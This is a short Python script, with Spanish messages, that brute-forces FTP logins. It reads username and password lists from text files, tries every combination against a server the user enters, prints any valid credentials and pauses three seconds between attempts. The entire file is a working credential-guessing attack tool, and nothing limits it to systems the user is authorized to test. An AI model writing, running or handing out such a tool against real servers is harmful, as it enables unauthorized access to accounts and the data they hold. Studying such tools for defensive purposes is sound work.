from ftplib import FTP
import time


def fuerzabruta(target, usu, pas):
    ftp = FTP(target)
    try:
        ftp.login(usu, pas)
        print(f"[OK] Autenticacion valida\t{usu}:{pas}")
    except:
        print(f"[X] Fallo la conexion\t{usu}:{pas}")

def main():
    target = input("Ingrese el servidor FTP: ")
    u = open("usuarios.txt", "r")
    usuarios = u.read().split("\n")
    u.close()
    p = open("passwords.txt", "r")
    passwords = p.read().split("\n")
    p.close()
    for i in usuarios:
        for j in passwords:
            #print(f"{i}:{j}")
            fuerzabruta(target, i, j)
            time.sleep(3)

if __name__ == '__main__':
    main()
